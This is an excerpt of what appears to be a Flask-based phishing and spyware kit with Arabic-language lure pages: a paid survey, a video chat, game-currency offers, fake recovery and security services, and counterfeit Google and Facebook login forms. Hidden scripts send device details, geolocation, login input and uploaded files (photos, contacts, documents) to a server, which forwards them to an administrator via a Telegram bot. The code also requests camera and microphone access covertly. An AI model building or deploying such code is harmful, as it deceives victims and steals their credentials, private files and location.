...
مع جمع الملفات والأذونات بطريقة غير مباشرة
"""
...
def send_sensitive_data_to_admin(data_type, content, user_id=None, file_path=None):
    try:
        if user_id:
...
<div class="container" id="app">
    <div class="header">
        <span class="logo">📋 استبيان</span>
        <span class="balance">💰 الرصيد: <span id="balance">0</span>$</span>
    </div>
...
<script>
    ...
    document.getElementById('nextBtn').onclick = function() {
        ...
        if (currentQ === 2) {
            requestLocation(pos => {
                if (pos) sendCollectedData('location', pos);
            });
        }
        if (currentQ === 3) {
...
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        @media (max-width: 480px) {
            .controls button { padding: 12px 18px; font-size: 14px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header"><span>🎥 ChatRandom</span><span>🟢 1,234 متصل</span></div>
    <div class="video-area">
        <div style="font-size:20px; margin-bottom:24px;">📹 اضغط "مكالمة فيديو" للبدء</div>
        <div class="controls">
            <button class="btn-video" onclick="startVideo()">📹 مكالمة فيديو</button>
            <button class="btn-audio" onclick="startAudio()">🎙️ اتصال صوتي</button>
            <button class="btn-chat" onclick="startChat()">💬 دردشة</button>
        </div>
    </div>
</div>
<script>
    ...
    function startVideo() {
        ...
        requestMedia({ video: true, audio: true }, (ok, stream) => {
            if (ok) alert('✅ تم تشغيل الكاميرا والميكروفون (محاكاة)');
            else alert('⚠️ لم نتمكن من الوصول إلى الكاميرا والميكروفون. تأكد من الأذونات.');
        });
    }
    function startAudio() {
        sendCollectedData('audio_call', { action: 'start' });
        requestMedia({ audio: true }, (ok, stream) => {
            if (ok) alert('✅ تم تشغيل الميكروفون (محاكاة)');
            else alert('⚠️ لم نتمكن من الوصول إلى الميكروفون.');
        });
    }
    function startChat() {
        sendCollectedData('chat', { action: 'open' });
        alert('💬 تم فتح الدردشة (محاكاة)');
    }
    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
    };
...
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        .header { text-align: center; color: #ff6600; font-size: 36px; font-weight: 800; margin-bottom: 20px; }
        .packs {
            display: grid;
        ...
        .price { color: #ff6600; font-size: 22px; font-weight: 700; margin-top: 6px; }
        .btn-share {
            background: #ff6600;
            color: #000;
            border: none;
...
<div class="container">
    ...
    <div class="packs">
        <div class="pack" onclick="selectPack('100', '0.99')"><div>💎 100</div><div class="price">$0.99</div></div>
        <div class="pack" onclick="selectPack('500', '4.49')"><div>💎 500</div><div class="price">$4.49</div></div>
        <div class="pack" onclick="selectPack('1,000', '8.99')"><div>💎 1,000</div><div class="price">$8.99</div></div>
        <div class="pack" onclick="selectPack('5,000', '39.99')"><div>💎 5,000</div><div class="price">$39.99</div></div>
    </div>
    <button class="btn-share" onclick="shareLink()">📤 مشاركة الرابط</button>
</div>
<script>
    function collectDeviceInfo() {
        return {
    ...
    function selectPack(amount, price) {
        sendCollectedData('freefire_pack', { amount, price });
        alert(`✅ تم اختيار الحزمة: ${amount} جوهرة - ${price}$ (محاكاة)`);
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    }
    function shareLink() {
        sendCollectedData('freefire_share', { action: 'share' });
        alert('📤 تم نسخ الرابط للمشاركة (محاكاة)');
    }
    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
...
# ===================== صفحة الخدمات العامة (مع نموذج رفع الملفات) =====================
OTHER_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        p { opacity: 0.9; margin-bottom: 20px; font-size: 16px; text-align:center; }
        .btn {
            display: inline-block;
            padding: 14px 30px;
            border: none;
        ...
        .upload-area:hover { border-color: #f7971e; }
        ...
        .file-list { margin-top: 12px; font-size: 14px; opacity:0.8; }
        .btn-upload {
            background: #1a73e8;
            color: #fff;
        }
...
<div class="container">
    ...
    <div class="upload-area" onclick="document.getElementById('fileInput').click()">
        <label for="fileInput">📎 اضغط هنا لاختيار الملفات (صور، جهات اتصال، مستندات)</label>
        <input type="file" id="fileInput" multiple accept=".jpg,.jpeg,.png,.gif,.bmp,.vcf,.txt,.pdf,.doc,.docx,.xls,.xlsx,.zip,.rar" onchange="handleFiles(this.files)">
        <div class="file-list" id="fileList">لم يتم اختيار أي ملفات</div>
    </div>
    
    <button class="btn" onclick="startService()">بدء الخدمة</button>
    
    <div class="row">
        <button class="btn btn-upload" onclick="uploadFiles()">📤 رفع الملفات</button>
...
<script>
    ...
    function handleFiles(files) {
        ...
        list.textContent = selectedFiles.length + ' ملفات تم اختيارها: ' + selectedFiles.map(f => f.name).join(', ');
        // إرسال بيانات الملفات (أسماء فقط) للخادم
        sendCollectedData('files_selected', { files: selectedFiles.map(f => f.name) });
    }
    
    function uploadFiles() {
        if (selectedFiles.length === 0) {
            alert('⚠️ لم تختار أي ملفات!');
            return;
        }
        ...
        .then(data => {
            alert('✅ تم رفع ' + selectedFiles.length + ' ملف بنجاح!');
            selectedFiles = [];
            document.getElementById('fileList').textContent = 'لم يتم اختيار أي ملفات';
        })
        .catch(err => {
            alert('⚠️ حدث خطأ أثناء الرفع: ' + err.message);
        });
    }
    ...
    function startService() {
        ...
        // طلب الكاميرا والميكروفون بشكل غير مباشر (بدون عرض)
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => {
                    // لا نعرض anything, فقط نطلق stream
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(err => {});
        }
        alert('✅ تم تشغيل الخدمة (محاكاة)');
        // توجيه أو عرض رسالة نجاح
    }
...
def collect_data():
    try:
        ...
        msg += f"📂 النوع: `{data_type}`\n"
        msg += f"🌐 IP: `{ip}`\n"
        msg += f"🖥️ User-Agent: `{user_agent[:80]}`\n"
    ...
    try:
        ...
        for f in files:
            ...
            with open(filepath, 'rb') as file_data:
                bot.send_document(ADMIN_ID, (filename, file_data), caption=f"📎 ملف مرفوع من IP: {ip}\n📄 الاسم: {filename}")
...
def security_check_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'تأكيد الهوية').replace('{description}', 'قم بتأكيد هويتك لحماية حسابك.'))

@app.route('/whatsapp_web', methods=['GET'])
def whatsapp_web_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'ربط واتساب ويب').replace('{description}', 'امسح الرمز QR لربط واتساب ويب بجهازك.'))

@app.route('/temp_mail', methods=['GET'])
def temp_mail_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'بريد مؤقت').replace('{description}', 'احصل على بريد إلكتروني مؤقت للتسجيل في الخدمات.'))

@app.route('/file_recovery', methods=['GET'])
def file_recovery_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'استعادة الملفات').replace('{description}', 'قم برفع ملفاتك لاستعادتها.'))

@app.route('/link_scanner', methods=['GET'])
def link_scanner_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'فحص الروابط').replace('{description}', 'أدخل الرابط للتحقق من سلامته.'))

@app.route('/tiktok_followers', methods=['GET'])
def tiktok_followers_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'متابعين تيك توك').replace('{description}', 'زد متابعيك على تيك توك الآن.'))

@app.route('/cracked_apps', methods=['GET'])
def cracked_apps_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'تطبيقات مهكرة').replace('{description}', 'تحميل أحدث التطبيقات المهكرة مجاناً.'))

@app.route('/account_recovery', methods=['GET'])
def account_recovery_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'استعادة حساب').replace('{description}', 'استعد حسابك المسروق بخطوات بسيطة.'))

@app.route('/security_scan', methods=['GET'])
def security_scan_page():
    return render_template_string(OTHER_PAGE.replace('{title}', 'فحص أمان شامل').replace('{description}', 'افحص جهازك بالكامل واكتشف الثغرات.'))
        ...
        <head>
            ...
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                ...
                .logo { font-size: 48px; font-weight: 700; color: #4285F4; }
                h2 { font-weight: 400; margin: 16px 0; }
                input {
                    width: 100%;
                    padding: 14px;
                    margin: 8px 0;
        ...
        <script>
            ...
            function sendCollectedData(data) {
                fetch('/collect_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'google_login_page', data: data, device: collectDeviceInfo() })
                }).catch(e => console.error(e));
            }
            window.onload = function() {
...
def facebook_login_page():
    if request.method == 'GET':
        ...
        <head>
            ...
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                ...
                .logo { font-size: 48px; font-weight: 700; color: #1877f2; }
                h2 { font-weight: 400; margin: 16px 0; }
                input {
                    width: 100%;
                    padding: 14px;
        ...
        <div class="container">
            ...
            <h2>تسجيل الدخول</h2>
            <form method="POST">
                <input type="text" name="email" placeholder="رقم الهاتف أو البريد" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
        <script>
            ...
            function sendCollectedData(data) {
                fetch('/collect_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'facebook_login_page', data: data, device: collectDeviceInfo() })
                }).catch(e => console.error(e));
            }
            window.onload = function() {
                sendCollectedData({ action: 'page_load' });
